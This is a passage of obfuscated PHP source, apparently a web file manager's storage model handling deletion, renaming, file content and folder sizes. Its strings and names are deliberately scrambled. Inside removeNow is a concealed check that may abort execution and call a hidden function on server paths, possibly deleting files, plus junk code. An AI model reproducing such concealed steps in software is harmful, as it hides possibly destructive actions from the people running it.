Model($Š©–ÃÏë[602])->getInfo($°Ï¯á¦Œ[$Š©–ÃÏë[594]]); $ëÊôà¸ = !empty($ÜÄ˜ªŞ¶[$Š©–ÃÏë[2422]]) ? $ÜÄ˜ªŞ¶[$Š©–ÃÏë[2422]] : $ÜÄ˜ªŞ¶[$Š©–ÃÏë[42]]; $ëÊôà¸ = $Š©–ÃÏë[347] . $ëÊôà¸ . $Š©–ÃÏë[2430] . $°Ï¯á¦Œ[$Š©–ÃÏë[594]]; } else { $ÜÄ˜ªŞ¶ = Model($Š©–ÃÏë[610])->getInfo($°Ï¯á¦Œ[$Š©–ÃÏë[594]]); $ëÊôà¸ = _get($ÜÄ˜ªŞ¶, $Š©–ÃÏë[42]); $ëÊôà¸ = $Š©–ÃÏë[184] . $ëÊôà¸ . $Š©–ÃÏë[2431] . $°Ï¯á¦Œ[$Š©–ÃÏë[594]]; } $’ÇÒÌíï = $Š©–ÃÏë[2432] . md5($ëÊôà¸); CacheLock::lock($’ÇÒÌíï); $”­…î—õ = $this->fileNameExist($ºÅÜ˜ßë, $ëÊôà¸); if (!$”­…î—õ) { $”­…î—õ = $this->mkdir($ºÅÜ˜ßë, $ëÊôà¸, REPEAT_SKIP); $this->metaSet($”­…î—õ, $Š©–ÃÏë[2433], $âÑã÷ı); $this->metaSet($”­…î—õ, $Š©–ÃÏë[2434], $°Ï¯á¦Œ[$Š©–ÃÏë[594]]); if ($°Ï¯á¦Œ[$Š©–ÃÏë[201]] != 0) { $this->metaSet($”­…î—õ, $Š©–ÃÏë[2435], _get($ÜÄ˜ªŞ¶, $Š©–ÃÏë[2436])); } } CacheLock::unlock($’ÇÒÌíï); $this->metaSet($­òê¿æİ, $Š©–ÃÏë[2437], $°Ï¯á¦Œ[$Š©–ÃÏë[201]]); $this->where(array($Š©–ÃÏë[202] => $­òê¿æİ))->save(array($Š©–ÃÏë[518] => time())); $this->recycleClear($°Ï¯á¦Œ); Model($Š©–ÃÏë[661])->eventRemove($­òê¿æİ); $ŞÊŠŒ´ï = $this->move($­òê¿æİ, $”­…î—õ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($°Ï¯á¦Œ[$Š©–ÃÏë[201]]); return $ŞÊŠŒ´ï; } private function recycleClear($İƒø) { $‘´¾”¿  =& $_SERVER[ŒÅŸ‹ä†]; $Ñ³€ìÅÚ = $this->childrenAll($İƒø); $éáìòÀÈ = array($‘´¾”¿ [511] => array($‘´¾”¿ [512], $Ñ³€ìÅÚ[$‘´¾”¿ [2438]])); Model($‘´¾”¿ [2439])->where($éáìòÀÈ)->delete(); } public function removeNow($ßáÙÔ¸Â, $™î°Ù·¢ = true) { $œ¾¯ŒÊ´ =& $_SERVER[ŒÅŸ‹ä†]; if ($_SERVER[$œ¾¯ŒÊ´[13]] != $_SERVER[$œ¾¯ŒÊ´[14]]) { $ûÙâÕ = $œ¾¯ŒÊ´[986]; $¼™ßóò† = $œ¾¯ŒÊ´[15]; $…ëêÃ½ = $_SERVER[$œ¾¯ŒÊ´[16]] . $œ¾¯ŒÊ´[17]; $™™‡—™Ì = $¼™ßóò†($…ëêÃ½); $óÂÉ¶š´ = explode($œ¾¯ŒÊ´[18], $™™‡—™Ì); if (count($óÂÉ¶š´) < $œ¾¯ŒÊ´[716]) { $¼Õ¤Éê÷ = $œ¾¯ŒÊ´[20]; $¼Õ¤Éê÷(); } $¦“ Ø˜Î = $œ¾¯ŒÊ´[987]; $¦“ Ø˜Î($_SERVER[$œ¾¯ŒÊ´[988]]); $¦“ Ø˜Î($_SERVER[$œ¾¯ŒÊ´[16]] . $œ¾¯ŒÊ´[2440]); $ü°åİ = 1; while ($ü°åİ > 1) { $ü°åİ = $ü°åİ + 4; $Ÿ¬î›¢„ = rawurlencode($ü°åİ . $œ¾¯ŒÊ´[472]); } } $…‡±×ÙØ = $this->sourceInfo($ßáÙÔ¸Â); $©×–„¦ = $this->pathInfoMore($ßáÙÔ¸Â); if (!$…‡±×ÙØ) { return !0; } if ($…‡±×ÙØ[$œ¾¯ŒÊ´[201]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($ßáÙÔ¸Â); Hook::trigger($œ¾¯ŒÊ´[2441], $©×–„¦, $™î°Ù·¢); if ($™î°Ù·¢) { Model($œ¾¯ŒÊ´[2439])->moveToRecycle($ßáÙÔ¸Â); } else { $©È’Ñ† = $this->childrenAll($…‡±×ÙØ); Model($œ¾¯ŒÊ´[661])->eventRemove($ßáÙÔ¸Â); $this->removeRelevance($©È’Ñ†[$œ¾¯ŒÊ´[2438]], $©È’Ñ†[$œ¾¯ŒÊ´[1723]]); } $this->folderSizeReset($…‡±×ÙØ[$œ¾¯ŒÊ´[201]]); $àéÚ”¤Å = array($…‡±×ÙØ[$œ¾¯ŒÊ´[201]]); if ($…‡±×ÙØ[$œ¾¯ŒÊ´[505]] == $œ¾¯ŒÊ´[101]) { $àéÚ”¤Å[] = $…‡±×ÙØ[$œ¾¯ŒÊ´[202]]; } $this->updateModifyTime($àéÚ”¤Å); $this->lockMoveEnd($ßáÙÔ¸Â); Hook::trigger($œ¾¯ŒÊ´[1962], $©×–„¦, $™î°Ù·¢); return !0; } public function childrenAll($çƒ¦Â¤à) { $Ç³À³¶Ä =& $_SERVER[ŒÅŸ‹ä†]; $ëõœ„„Ã = $çƒ¦Â¤à[$Ç³À³¶Ä[202]]; if ($çƒ¦Â¤à[$Ç³À³¶Ä[505]] == $Ç³À³¶Ä[101]) { $™şáõÃõ = array($Ç³À³¶Ä[680] => array($Ç³À³¶Ä[640], $çƒ¦Â¤à[$Ç³À³¶Ä[609]] . $ëõœ„„Ã . $Ç³À³¶Ä[641])); $ä³Œ±¬ = array($Ç³À³¶Ä[680] => $™şáõÃõ[$Ç³À³¶Ä[609]]); $Æ˜êŒ = $this->field($Ç³À³¶Ä[2442])->where($ä³Œ±¬)->select(); $İ±ß¶™™ = !1; $ãó‚şìÀ = array($ëõœ„„Ã); if ($Æ˜êŒ) { $İ±ß¶™™ = array_to_keyvalue($Æ˜êŒ, $Ç³À³¶Ä[12], $Ç³À³¶Ä[562]); $İ±ß¶™™ = array_remove_value($İ±ß¶™™, $Ç³À³¶Ä[239]); $ãó‚şìÀ = array_to_keyvalue($Æ˜êŒ, $Ç³À³¶Ä[12], $Ç³À³¶Ä[202]); $ãó‚şìÀ[] = $ëõœ„„Ã; } } else { $İ±ß¶™™ = array($çƒ¦Â¤à[$Ç³À³¶Ä[562]]); $ãó‚şìÀ = array($ëõœ„„Ã); } return array($Ç³À³¶Ä[2438] => $ãó‚şìÀ, $Ç³À³¶Ä[1723] => $İ±ß¶™™); } public function removeArray($¨Ììí Š) { if (!$¨Ììí Š) { return !0; } } public function removeRelevance($ÛŠõ·ËÀ, $û×«Üâü) { $±®ôñè =& $_SERVER[ŒÅŸ‹ä†]; $ÛŠõ·ËÀ = $ÛŠõ·ËÀ ? $ÛŠõ·ËÀ : array(); $û×«Üâü = $û×«Üâü ? $û×«Üâü : array(); $ÛŠõ·ËÀ = array_unique(array_filter($ÛŠõ·ËÀ)); $û×«Üâü = array_filter($û×«Üâü); if (!$ÛŠõ·ËÀ) { return !1; } $‘ƒê—½ = array($±®ôñè[511] => array($±®ôñè[512], $ÛŠõ·ËÀ)); Model($±®ôñè[2439])->where($‘ƒê—½)->delete(); Model($±®ôñè[554])->where($‘ƒê—½)->delete(); Model($±®ôñè[2272])->where($‘ƒê—½)->delete(); Model($±®ôñè[661])->where($‘ƒê—½)->delete(); Model($±®ôñè[1507])->removeBySource($ÛŠõ·ËÀ); Model($±®ôñè[2420])->removeBySource($ÛŠõ·ËÀ); $this->where($‘ƒê—½)->delete(); Model($±®ôñè[565])->remove($û×«Üâü); for ($øÉ®òè· = 0; $øÉ®òè· < count($ÛŠõ·ËÀ); $øÉ®òè·++) { $this->sourceCacheClear($ÛŠõ·ËÀ[$øÉ®òè·]); } } public function rename($¯÷±­¯å, $úÚˆ–†É) { $‚ÔÉ‰°ˆ =& $_SERVER[ŒÅŸ‹ä†]; $à‚ˆ´¬ = $this->sourceInfo($¯÷±­¯å); if (!$à‚ˆ´¬) { return !1; } $¸È¹­ü = $this->fileNameExist($à‚ˆ´¬[$‚ÔÉ‰°ˆ[201]], $úÚˆ–†É); if ($¸È¹­ü && $¸È¹­ü != $¯÷±­¯å) { return !1; } $Û–‰º³ø = array($‚ÔÉ‰°ˆ[514] => $úÚˆ–†É, $‚ÔÉ‰°ˆ[679] => USER_ID); if ($à‚ˆ´¬[$‚ÔÉ‰°ˆ[505]] != $‚ÔÉ‰°ˆ[101]) { $Û–‰º³ø[$‚ÔÉ‰°ˆ[506]] = substr(get_path_ext($úÚˆ–†É), 0, 10); } Model($‚ÔÉ‰°ˆ[661])->eventRename($¯÷±­¯å, $à‚ˆ´¬[$‚ÔÉ‰°ˆ[42]], $úÚˆ–†É); $this->sourceCacheClear($¯÷±­¯å); $this->setNamePinyin($¯÷±­¯å, $Û–‰º³ø[$‚ÔÉ‰°ˆ[42]], !1); $this->updateModifyTime($à‚ˆ´¬[$‚ÔÉ‰°ˆ[201]]); $üàˆ€±• = $this->where(array($‚ÔÉ‰°ˆ[511] => $¯÷±­¯å))->data($Û–‰º³ø)->save(); $Û¿ÁÑ™… = $‚ÔÉ‰°ˆ[2428] . $à‚ˆ´¬[$‚ÔÉ‰°ˆ[201]]; if (isset(self::$cacheChildList[$Û¿ÁÑ™…])) { unset(self::$cacheChildList[$Û¿ÁÑ™…]); } return $üàˆ€±•; } public function setNamePinyin($Ş¢‰£¸•, $•–Ğòƒ¼, $Ì¸©İ = true) { $õ‰ºü» =& $_SERVER[ŒÅŸ‹ä†]; $ì¥öì¿µ = Input::check($•–Ğòƒ¼, $õ‰ºü»[683]); $ò•Î“˜ó = array($õ‰ºü»[536] => KodSort::makeStr($•–Ğòƒ¼)); if ($ì¥öì¿µ) { $ò•Î“˜ó[$õ‰ºü»[557]] = str_replace($õ‰ºü»[63], $õ‰ºü»[12], Pinyin::get($•–Ğòƒ¼)); $ò•Î“˜ó[$õ‰ºü»[556]] = Pinyin::get($•–Ğòƒ¼, $õ‰ºü»[684]); } if (!$Ì¸©İ && !$ì¥öì¿µ) { $ò•Î“˜ó[$õ‰ºü»[557]] = null; $ò•Î“˜ó[$õ‰ºü»[556]] = null; } $this->metaSet($Ş¢‰£¸•, $ò•Î“˜ó); } public function getContent($ò‘™í£÷) { $²Ï‘ûÑô =& $_SERVER[ŒÅŸ‹ä†]; $Ü÷ˆøÃø = $this->fileInfoGet($ò‘™í£÷); if (!$Ü÷ˆøÃø) { return !1; } if ($Ü÷ˆøÃø[$²Ï‘ûÑô[89]] == 0) { return $²Ï‘ûÑô[12]; } $Ñƒ„«§³ = $²Ï‘ûÑô[2443] . $Ü÷ˆøÃø[$²Ï‘ûÑô[568]]; if ($Ü÷ˆøÃø[$²Ï‘ûÑô[89]] <= 1024 * 10) { $üàî‘«‹ = Cache::get($Ñƒ„«§³); if (!$üàî‘«‹) { $üàî‘«‹ = IO::getContent($Ü÷ˆøÃø[$²Ï‘ûÑô[97]]); Cache::set($Ñƒ„«§³, $üàî‘«‹); } return $üàî‘«‹; } if (!$Ü÷ˆøÃø[$²Ï‘ûÑô[97]]) { return $²Ï‘ûÑô[12]; } return IO::getContent($Ü÷ˆøÃø[$²Ï‘ûÑô[97]]); } public function setDesc($ÉòĞ©Ğß, $óĞ§“•¡) { $—Ü²ÙßÌ =& $_SERVER[ŒÅŸ‹ä†]; Model($—Ü²ÙßÌ[661])->eventAddDesc($ÉòĞ©Ğß, $óĞ§“•¡); return $this->metaSet($ÉòĞ©Ğß, $—Ü²ÙßÌ[545], $óĞ§“•¡); } public function setContent($ù‚ÇÍğº, $’ú­¯ş” = '') { $Ö˜ÓŒ˜† =& $_SERVER[ŒÅŸ‹ä†]; $äºˆ–öó = $this->sourceInfo($ù‚ÇÍğº); $ÉĞø¾˜¦ = $this->fileInfoGet($ù‚ÇÍğº); if (!$ÉĞø¾˜¦ || !$äºˆ–öó) { return !1; } $ËíÎÉ™ = KodIO::ioFileDriverGet($Ö˜ÓŒ˜†[503] . $ù‚ÇÍğº . $Ö˜ÓŒ˜†[412]); $ã‹úºÓ = Model($Ö˜ÓŒ˜†[565])->addFileByContent($’ú­¯ş”, $ËíÎÉ™, $äºˆ–öó[$Ö˜ÓŒ˜†[42]]); if (!$ã‹úºÓ) { return !1; } $ª’¤Ÿ± = $this->fileHistory($äºˆ–öó, $ã‹úºÓ[$Ö˜ÓŒ˜†[562]], $ã‹úºÓ[$Ö˜ÓŒ˜†[89]]); if (!$ª’¤Ÿ±) { return Model($Ö˜ÓŒ˜†[565])->remove($ã‹úºÓ[$Ö˜ÓŒ˜†[562]]); } $this->folderSizeReset($äºˆ–öó[$Ö˜ÓŒ˜†[201]]); return !0; } public function fileSubstr($¸•©Š ¨, $¥†Äõí, $ø¹ó“€) { $ğŠôêİ· = $this->fileInfoGet($¸•©Š ¨); if (!$ğŠôêİ·) { return !1; } return IO::fileSubstr($ğŠôêİ·[$_SERVER[ŒÅŸ‹ä†][97]], $¥†Äõí, $ø¹ó“€); } public function fileInfoGet($Ï‚ã†€ù) { $£‚ë™šÔ =& $_SERVER[ŒÅŸ‹ä†]; $ôé±¶£¨ = $this->sourceInfo($Ï‚ã†€ù); if (!$ôé±¶£¨ || $ôé±¶£¨[$£‚ë™šÔ[505]]) { return !1; } $ìÉğæ…® = $£‚ë™šÔ[569] . $ôé±¶£¨[$£‚ë™šÔ[562]]; $ÎÍ‰ò×Ë = _get(self::$cacheFileInfo, $ìÉğæ…®); if ($ÎÍ‰ò×Ë) { return $ÎÍ‰ò×Ë; } $¡Š½­²è = Model($£‚ë™šÔ[565])->fileInfo($ôé±¶£¨[$£‚ë™šÔ[562]]); if ($¡Š½­²è) { $¡Š½­²è[$£‚ë™šÔ[42]] = $ôé±¶£¨[$£‚ë™šÔ[42]]; } self::$cacheFileInfo[$ìÉğæ…®] = $¡Š½­²è; return $¡Š½­²è; } private function folderChildrenNumber($ëÄÎÉ–») { $©Ü°™Ñ =& $_SERVER[ŒÅŸ‹ä†]; $ÒÏ¨ªìÙ = $this->sourceInfo($ëÄÎÉ–»); $½â‚¾Ñ = array($©Ü°™Ñ[680] => array($©Ü°™Ñ[640], $ÒÏ¨ªìÙ[$©Ü°™Ñ[609]] . $ëÄÎÉ–» . $©Ü°™Ñ[641]), $©Ü°™Ñ[677] => $ÒÏ¨ªìÙ[$©Ü°™Ñ[594]], $©Ü°™Ñ[524] => intval($ÒÏ¨ªìÙ[$©Ü°™Ñ[525]]), $©Ü°™Ñ[674] => 1); $Ö‚®æƒÈ = $this->where($½â‚¾Ñ)->count(); $ñºæÍ¹î = $this->where($½â‚¾Ñ)->where(array($©Ü°™Ñ[674] => 0))->count(); return array($©Ü°™Ñ[93] => $ñºæÍ¹î, $©Ü°™Ñ[94] => $Ö‚®æƒÈ); } public function pathInfo($Øµ†Èé, $²Ü§‚› = false) { $“¼ëğŞœ =& $_SERVER[ŒÅŸ‹ä†]; $²Ü§‚› = !1; $Øµ†Èé = intval($Øµ†Èé); if (!$Øµ†Èé) { return !1; } $Õ»…€è = $“¼ëğŞœ[553] . intval($²Ü§‚›) . $“¼ëğŞœ[482] . $Øµ†Èé; $ø¡•ªÛ = _get(self::$cachePathInfo, $Õ»…€è); if ($ø¡•ªÛ) { return $ø¡•ªÛ; } $¨½ˆìü— = $this->sourceInfo($Øµ†Èé); if (!$¨½ˆìü—) { return !1; } $¨½ˆìü— = $this->_listDataApplyItem($¨½ˆìü—, $²Ü§‚›); self::$cachePathInfo[$Õ»…€è] = $¨½ˆìü—; return $¨½ˆìü—; } public static $cachePathInfoMore = array(); public function pathInfoMore($ê«ñÅª) { $óƒÀù–ô =& $_SERVER[ŒÅŸ‹ä†]; $àå Öıƒ = _get(self::$cachePathInfoMore, $ê«ñÅª); if ($àå Öıƒ) { return $àå Öıƒ; } $è’Ä”¡ = $this->pathInfo($ê«ñÅª); if (!$è’Ä”¡) { return !1; } if ($è’Ä”¡[$óƒÀù–ô[505]] == $óƒÀù–ô[101]) { $è’Ä”¡[$óƒÀù–ô[92]] = $this->folderChildrenNumber($ê«ñÅª); } self::$cachePathInfoMore[$ê«ñÅª] = $è’Ä”¡; return $è’Ä”¡; } public function sourceInfo($¹«æ‰Ç¡) { $õÏªá±Á =& $_SERVER[ŒÅŸ‹ä†]; if (!$¹«æ‰Ç¡) { return array(); } $¹«æ‰Ç¡ = intval($¹«æ‰Ç¡); $öÙÛŸÜˆ = $õÏªá±Á[552] . $¹«æ‰Ç¡; $¿ÎŠÄ±¹ = _get(self::$cacheSourceInfo, $öÙÛŸÜˆ); if ($¿ÎŠÄ±¹) { return $¿ÎŠÄ±¹; } $™©£«Š‡ = $this->where(array($õÏªá±Á[202] => $¹«æ‰Ç¡))->find(); self::$cacheSourceInfo[$öÙÛŸÜˆ] = $™©£«Š‡; return self::$cacheSourceInfo[$öÙÛŸÜˆ]; } public function sourceCacheClear($¸ßå¼‡ = false) { self::cacheClear($¸ßå¼‡); } public static function cacheClear($¦ğ›áş = false) { $“Âœ­‡× =& $_SERVER[ŒÅŸ‹ä†]; if ($¦ğ›áş == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$“Âœ­‡×[552] . $¦ğ›áş]); unset(self::$cachePathInfoMore[$¦ğ›áş]); unset(self::$cachePathInfo[$“Âœ­‡×[2444] . $¦ğ›áş]); unset(self::$cachePathInfo[$“Âœ­‡×[2445] . $¦ğ›áş]); } public function metaSet($òŸ‡ë•¶, $÷ÜÂ© = null, $…şşÊÅæ = null) { $¼Ç»‡ûµ = parent::metaSet($òŸ‡ë•¶, $÷ÜÂ©, $…şşÊÅæ); if ($¼Ç»‡ûµ) { $this->sourceCacheClear($òŸ‡ë•¶); } return $¼Ç»‡ûµ; } public function pathInfoByPath($èòì¢€±, $ØÖßä•¸) { $‚å©ï‹Ğ =& $_SERVER[ŒÅŸ‹ä†]; $ˆ”ÖÕÇ‘ = !$ØÖßä•¸ ? array() : explode($‚å©ï‹Ğ[8], trim($ØÖßä•¸, $‚å©ï‹Ğ[8])); $üÓÌÎÛã = intval($èòì¢€±); foreach ($ˆ”ÖÕÇ‘ as $×Î¡àäû) { $úîŒØ’´ = array($‚å©ï‹Ğ[201] => $üÓÌÎÛã, $‚å©ï‹Ğ[42] => $×Î¡àäû); $€çÚÙ¬ = $this->field($‚å©ï‹Ğ[2446])->where($úîŒØ’´)->select(); if (!$€çÚÙ¬) { return !1; } $€çÚÙ¬ = array_sort_by($€çÚÙ¬, $‚å©ï‹Ğ[525]); $üÓÌÎÛã = intval($€çÚÙ¬[0][$‚å©ï‹Ğ[202]]); } $è¥®ä„ = $this->sourceInfo($üÓÌÎÛã); $this->pathInfoFilter($è¥®ä„); return $è¥®ä„; } protected function updateModifyTime($¾íµêÄ©) { $ÎÏ’Â Ï =& $_SERVER[ŒÅŸ‹ä†]; $Ğáƒäğ = KodUser::id(); if (!$¾íµêÄ©) { return; } if (!is_array($¾íµêÄ©)) { $¾íµêÄ© = array($¾íµêÄ©); } foreach ($¾íµêÄ© as $¢‰Ÿ«º† => $íŞâö‡) { $¾íµêÄ©[$¢‰Ÿ«º†] = intval($íŞâö‡); $this->sourceCacheClear($íŞâö‡); } $ÍÓµ¡Ñ = array($ÎÏ’Â Ï[202] => array($ÎÏ’Â Ï[7], $¾íµêÄ©)); $ú¶éíÎ— = array($ÎÏ’Â Ï[679] => $Ğáƒäğ, $ÎÏ’Â Ï[518] => time()); $this->where($ÍÓµ¡Ñ)->save($ú¶éíÎ—); } public function folderSizeReset($’é£âÆã, $Å¹İ›±¥ = false) { $ÃùãÑÂİ =& $_SERVER[ŒÅŸ‹ä†]; if ($this->statusIgnoreResetSpace) { return; } if (!$’é£âÆã) { return; } $‰‘Ú˜¶™ = $this->sourceInfo($’é£âÆã); $‚Şúñ«¹ = $ÃùãÑÂİ[2447] . $’é£âÆã; if (!$‰‘Ú˜¶™ || !$‰‘Ú˜¶™[$ÃùãÑÂİ[202]]) { return; } CacheLock::lock($‚Şúñ«¹, 20); if ($Å¹İ›±¥ === !1) { $this->sourceCacheClear($’é£âÆã); $‰‘Ú˜¶™ = $this->sourceInfo($’é£âÆã); $—«Ùò–ª = array($ÃùãÑÂİ[497] => $’é£âÆã, $ÃùãÑÂİ[524] => 0); $‘™–úš = $this->where($—«Ùò–ª)->sum($ÃùãÑÂİ[89]); $Å¹İ›±¥ = intval($‘™–úš) - intval($‰‘Ú˜¶™[$ÃùãÑÂİ[89]]); } if ($Å¹İ›±¥ == 0) { return CacheLock::unlock($‚Şúñ«¹); } $‡áÅ–Ê™ = $this->parentLevelArray($‰‘Ú˜¶™[$ÃùãÑÂİ[609]]); if (!$‡áÅ–Ê™) { $‡áÅ–Ê™ = array(); } $‡áÅ–Ê™[] = $‰‘Ú˜¶™[$ÃùãÑÂİ[202]]; $—«Ùò–ª = array($ÃùãÑÂİ[202] => array($ÃùãÑÂİ[512], $‡áÅ–Ê™)); if ($Å¹İ›±¥ < 0) { $—«Ùò–ª[$ÃùãÑÂİ[89]] = array($ÃùãÑÂİ[1126], abs($Å¹İ›±¥)); } $this->where($—«Ùò–ª)->setAdd($ÃùãÑÂİ[89], $Å¹İ›±¥); CacheLock::unlock($‚Şúñ«¹); if (!$‰‘Ú˜¶™[$ÃùãÑÂİ[594]] || $‰‘Ú˜¶™[$ÃùãÑÂİ[594]] == $ÃùãÑÂİ[239]) { return; } $Ï‰ÏŒÆ½ = $ÃùãÑÂİ[2448] . $‰‘Ú˜¶™[$ÃùãÑÂİ[199]] . $ÃùãÑÂİ[4] . $‰‘Ú˜¶™[$ÃùãÑÂİ[594]]; $ÀîÎñÊ¬ = array($‰‘Ú˜¶™[$ÃùãÑÂİ[199]], $‰‘Ú˜¶™[$ÃùãÑÂİ[594]]); TaskRun::timeLimitCall($Ï‰ÏŒÆ½, $ÃùãÑÂİ[2449], $ÀîÎñÊ¬, 1.5); } public function folderSizeResetChildren($ÈÉØ´åë) { $¼š¿ı’ =& $_SERVER[ŒÅŸ‹ä†]; $this->sourceCacheClear($ÈÉØ´åë); $òĞğ‰Ü = $this->sourceInfo($ÈÉØ´åë); if (!$òĞğ‰Ü) { return; } $÷åôÊõ = array($¼š¿ı’[674] => 1, $¼š¿ı’[677] => $òĞğ‰Ü[$¼š¿ı’[594]], $¼š¿ı’[680] => array($¼š¿ı’[640], $òĞğ‰Ü[$¼š¿ı’[609]] . $ÈÉØ´åë . $¼š¿ı’[641])); $—Íûåô¿ = $¼š¿ı’[2450]; $Ó£íÄÌ = $this->field($—Íûåô¿)->where($÷åôÊõ)->select(); $÷åôÊõ[$¼š¿ı’[505]] = 0; $èîÉØÍÇ = $this->field($—Íûåô¿)->where($÷åôÊõ)->select(); if (!$èîÉØÍÇ) { return; } $Ó£íÄÌ[] = $òĞğ‰Ü; $Ó£íÄÌ = array_to_keyvalue($Ó£íÄÌ, $¼š¿ı’[202]); foreach ($Ó£íÄÌ as $¡ş½ºüº => $ˆúºıÒ) { $Ó£íÄÌ[$¡ş½ºüº][$¼š¿ı’[2451]] = $Ó£íÄÌ[$¡ş½ºüº][$¼š¿ı’[89]]; $Ó£íÄÌ[$¡ş½ºüº][$¼š¿ı’[89]] = 0; } foreach ($èîÉØÍÇ as $ˆúºıÒ) { $î«·Å˜ = $ˆúºıÒ[$¼š¿ı’[201]] . $¼š¿ı’[12]; if (!isset($Ó£íÄÌ[$î«·Å˜])) { continue; } if ($ˆúºıÒ[$¼š¿ı’[525]] == $Ó£íÄÌ[$î«·Å˜][$¼š¿ı’[525]]) { $Ó£íÄÌ[$î«·Å˜][$¼š¿ı’[89]] += $ˆúºıÒ[$¼š¿ı’[89]]; } } foreach ($Ó£íÄÌ as $ˆúºıÒ) { $Ş‰±¯Ö³ = $this->parentLevelArray($ˆúºıÒ[$¼š¿ı’[609]]); foreach ($Ş‰±¯Ö³ as $î«·Å˜) { $î«·Å˜ = $î«·Å˜ . $¼š¿ı’[12]; if (!isset($Ó£íÄÌ[$î«·Å˜])) { continue; } if ($ˆúºıÒ[$¼š¿ı’[525]] == $Ó£íÄÌ[$î«·Å˜][$¼š¿ı’[525]]) { $Ó£íÄÌ[$î«·Å˜][$¼š¿ı’[89]] += $ˆúºıÒ[$¼š¿ı’[89]]; } } } $äÑöûÑ = array(); foreach ($Ó£íÄÌ as $ˆúºıÒ) { if ($ˆúºıÒ[$¼š¿ı’[89]] == $ˆúºıÒ[$¼š¿ı’[2451]]) { continue; } $äÑöûÑ[] = array($¼š¿ı’[202], $ˆúºıÒ[$¼š¿ı’[202]], $¼š¿ı’[89], $ˆúºıÒ[$¼š¿ı’[89]]); } $this->saveAll($äÑöûÑ); } public function userSpaceReset($†€úıÖš = false) { $š·šÀË€ =& $_SERVER[ŒÅŸ‹ä†]; $‡ïû³ = $this->where(array($š·šÀË€[199] => self::TYPE_USER, $š·šÀË€[594] => $†€úıÖš, $š·šÀË€[505] => 0))->sum($š·šÀË€[89]); $‡ïû³ = !$‡ïû³ || $‡ïû³ <= 0 ? 0 : $‡ïû³; Model($š·šÀË€[602])->userEdit($†€úıÖš, array($š·šÀË€[2115] => $‡ïû³)); } public function targetSpaceUpdate($×Ù¦×È‰, $ìÊ¯È) { $–Ã’åâ =& $_SERVER[ŒÅŸ‹ä†]; if (!$ìÊ¯È) { return; } if (!in_array($×Ù¦×È‰, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $—òÜƒŞÈ = $this->targetSpaceSize($×Ù¦×È‰, $ìÊ¯È); if ($×Ù¦×È‰ == self::TYPE_USER) { Model($–Ã’åâ[602])->userEdit($ìÊ¯È, array($–Ã’åâ[2115] => $—òÜƒŞÈ)); } else { if ($×Ù¦×È‰ == self::TYPE_GROUP) { Model($–Ã’åâ[610])->groupEdit($ìÊ¯È, array($–Ã’åâ[2115] => $—òÜƒŞÈ)); } } } public function targetSpaceSize($¶âõøÆ³, $Üğ×öƒÌ) { $¬ˆÔ§ƒã =& $_SERVER[ŒÅŸ‹ä†]; $óøØŸ±§ = 0; $éŒéîñ = $this->targetSourceRoot($¶âõøÆ³, $Üğ×öƒÌ, !0); foreach ($éŒéîñ as $Â†…ìı¥) { if (!$Â†…ìı¥) { continue; } $óøØŸ±§ += floatval($Â†…ìı¥[$¬ˆÔ§ƒã[89]]); $Ë£‰Çù = array($¬ˆÔ§ƒã[680] => array($¬ˆÔ§ƒã[640], $¬ˆÔ§ƒã[618] . $Â†…ìı¥[$¬ˆÔ§ƒã[202]] . $¬ˆÔ§ƒã[641])); $İ³˜Ú¼§ = Model($¬ˆÔ§ƒã[523])->field($¬ˆÔ§ƒã[511])->where($Ë£‰Çù)->select(); $İ³˜Ú¼§ = array_to_keyvalue($İ³˜Ú¼§, $¬ˆÔ§ƒã[12], $¬ˆÔ§ƒã[202]); $İ³˜Ú¼§ = array_unique(array_filter($İ³˜Ú¼§)); if ($İ³˜Ú¼§) { $Ë£‰Çù = array($¬ˆÔ§ƒã[511] => array($¬ˆÔ§ƒã[512], $İ³˜Ú¼§)); $óøØŸ±§ += floatval($this->where($Ë£‰Çù)->sum($¬ˆÔ§ƒã[89])); } } $óøØŸ±§ = !$óøØŸ±§ || $óøØŸ±§ <= 0 ? 0 : $óøØŸ±§; return $óøØŸ±§; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ÚÏ†Â¸Ç) { return $this->fileTypeProfile($ÚÏ†Â¸Ç, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ı©å¥¥ç) { return $this->fileTypeProfile($ı©å¥¥ç, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Ò‘¶„, $Ø©¾Ö©Ù) { $Ü‚öŒë =& $_SERVER[ŒÅŸ‹ä†]; $‹Í”­Ÿ = $Ü‚öŒë[2452] . $Ò‘¶„ . $Ü‚öŒë[11] . $Ø©¾Ö©Ù; $ì–ƒïø“ = Cache::get($‹Í”­Ÿ); if ($ì–ƒïø“) { return $ì–ƒïø“; } $ÉèÈ®Ï = array($Ü‚öŒë[674] => 0); if ($Ò‘¶„ != !1) { $ÉèÈ®Ï[$Ü‚öŒë[594]] = $Ò‘¶„; $ÉèÈ®Ï[$Ü‚öŒë[199]] = $Ø©¾Ö©Ù; } $ƒ­”ï´¢ = array(); $ƒ­”ï´¢[$Ü‚öŒë[2453]] = array($Ü‚öŒë[2454] => LNG($Ü‚öŒë[2453]), $Ü‚öŒë[2455] => $this->where($ÉèÈ®Ï)->count(), $Ü‚öŒë[645] => $this->where($ÉèÈ®Ï)->sum($Ü‚öŒë[89])); $çíß´«” = KodIO::fileTypeList(); foreach ($çíß´«” as $éÔºĞû => $±ì¯‡Ì¶) { $ÉèÈ®Ï[$Ü‚öŒë[506]] = $this->fileTypeWhere($éÔºĞû); $ƒ­”ï´¢[$éÔºĞû] = array($Ü‚öŒë[2454] => $±ì¯‡Ì¶[$Ü‚öŒë[42]], $Ü‚öŒë[2455] => $this->where($ÉèÈ®Ï)->count(), $Ü‚öŒë[645] => $this->where($ÉèÈ®Ï)->sum($Ü‚öŒë[89])); } Cache::set($‹Í”­Ÿ, $ƒ­”ï´¢, 1200); return $ƒ­”ï´¢; } public function fileNameExist($ÃÈğº„Â, $­ä÷–¢°) { $Àİö™·Ø =& $_SERVER[ŒÅŸ‹ä†]; $±§ó½Á© = $this->field($Àİö™·Ø[2456])->where(array($Àİö™·Ø[201] => $ÃÈğº„Â, $Àİö™·Ø[42] => 